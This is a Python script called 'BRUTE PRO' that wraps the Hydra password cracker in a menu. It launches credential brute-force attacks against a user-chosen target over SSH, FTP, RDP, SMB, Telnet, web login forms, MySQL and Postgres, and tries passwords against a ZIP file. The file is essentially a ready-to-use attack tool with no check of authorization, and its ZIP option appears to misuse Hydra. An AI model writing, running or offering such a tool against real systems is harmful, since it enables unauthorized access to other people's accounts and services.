import subprocess
import time
import sys
def typewriter(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
RESET = "\033[0m"

def banner():
    text = f"""
        {RED}██████  ██████  ██    ██ ████████ ███████     ██████  ██████   {RESET}
        {RED}██   ██ ██    ██ ██    ██    ██    ██          ██   ██ ██   ██  {RESET}
        {RED}██████  ██    ██ ██    ██    ██    █████       ██████  ██████   {RESET}
        {RED}██      ██    ██ ██    ██    ██    ██          ██   ██ ██   ██  {RESET}
        {RED}██       ██████   ██████     ██    ███████     ██████  ██   ██  {RESET}

        ========================================================
        {RED}======== BRUTE{RESET} {GREEN}PRO ============={RESET}
        {RED}======== THIS TOOL AUTOMATES HYDRA COMMANDS =========={RESET}
        {YELLOW}====== RESULTS ARE NOT ALWAYS 100% ACCURATE{RESET}
        ==========================================================
"""
    for line in text.split("\n"):
        typewriter(line, delay=0.01)

banner()
def main():
    print("===============================")
    print(                            "[Options]")
    print("===============================\n")
    print(f"{YELLOW}[1]:  SSH Brute-force")
    print("[2]:  FTP Brute-force")
    print("[3]:  RDP Brute-force (Windows Remote Desktop)")
    print("[4]:  SMB Brute-force (Windows file shares)")
    print("[5]:  Telnet Brute-force")
    print("[6]:  ZIP file Brute-force")
    print("[7]:  HTTP Brute-force (Web login)")
    print("[8]:  HTTP GET login Brute-force")
    print("[9]:  MySQL Database Brute-force")
    print(f"[10]: Postgres Database Brute-force{RESET}\n")
    users = "users.txt"
    passlist = "passlist.txt"
    option = int(input("Choose your option number: "))
    target = input("Enter the target (IP, URL or ZIP file): ")
    if not target:
        print("Unable to load the target")
        sys.exit()
    else:
        print(f"{RED}starting task...........\n{RESET}")
    if option == 1:
        result = subprocess.run(["hydra", "-L", users, "-P", passlist, f"ssh://{target}"], capture_output=True, text=True)
        print(result.stdout)
        print(result.stderr)
    elif option == 2:
        result = subprocess.run(["hydra", "-L", users, "-P", passlist, f"ftp://{target}"], capture_output=True, text=True)
        print(result.stdout)
        print(result.stderr)
    elif option == 3:
        result = subprocess.run(["hydra", "-L", users, "-P", passlist, f"rdp://{target}"], capture_output=True, text=True)
        print(result.stdout)
        print(result.stderr)
    elif option == 4:
        result = subprocess.run(["hydra", "-L", users, "-P", passlist, f"smb://{target}"], capture_output=True, text=True)
        print(result.stdout)
        print(result.stderr)
    elif option == 5:
        result = subprocess.run(["hydra", "-L", users, "-P", passlist, f"telnet://{target}"], capture_output=True, text=True)
        print(result.stdout)
        print(result.stderr)
    elif option == 6:
        result = subprocess.run(["hydra", "-P", passlist, "-t", "4", "zip", target], capture_output=True, text=True)
        print(result.stdout)
        print(result.stderr)
    elif option == 7:
        login_page = input("Enter login path (example: /login.php): ")
        fail_text = input("Enter failure text (example: Invalid): ")
        result = subprocess.run([
            "hydra", "-L", users, "-P", passlist, target,
            "http-post-form",
            f"{login_page}:username=^USER^&password=^PASS^:F={fail_text}"
        ], capture_output=True, text=True)
        print(result.stdout)
        print(result.stderr)
    elif option == 8:
        result = subprocess.run(["hydra", "-L", users, "-P", passlist, target, "http-get", "/"], capture_output=True, text=True)
        print(result.stdout)
        print(result.stderr)
    elif option == 9:
        result = subprocess.run(["hydra", "-L", users, "-P", passlist, f"mysql://{target}"], capture_output=True, text=True)
        print(result.stdout)
        print(result.stderr)
    elif option == 10:
        result = subprocess.run(["hydra", "-L", users, "-P", passlist, f"postgres://{target}"], capture_output=True, text=True)
        print(result.stdout)
        print(result.stderr)
    else:
        print("invalid option")

main()
